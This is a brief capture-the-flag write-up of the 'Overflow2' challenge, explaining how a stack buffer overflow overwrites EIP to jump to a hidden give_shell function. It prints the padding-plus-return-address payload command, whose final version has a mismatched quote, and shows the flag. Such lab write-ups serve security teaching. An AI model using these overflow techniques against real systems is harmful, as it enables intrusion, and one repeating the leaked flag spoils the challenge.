# Overflow2 - 70

```
This problem has a buffer overflow vulnerability! Can you get a shell?
You can solve this problem interactively here, and the source can be found here.
```

Similar to first one but quite different. Instead of entering password, we have to control eip by overflowing the buffer to run the give shell fucntion.
Note:give_shell is not called in any fuctnion.


At first, I tried $(python -c "print 'A' * 16 + '\xad\x84\x04\x08'") but I realized there are paddings.
So I just played around with it (though I could have used gdb to calculate the exact amount).

My payload:

```
pico15664@shell:/home/overflow2$ ./overflow2 $(python -c "print 'A * 28 + '\xad\x84\x04\x08'")
$cat flag.txt
controlling_%eip_feels_great
```
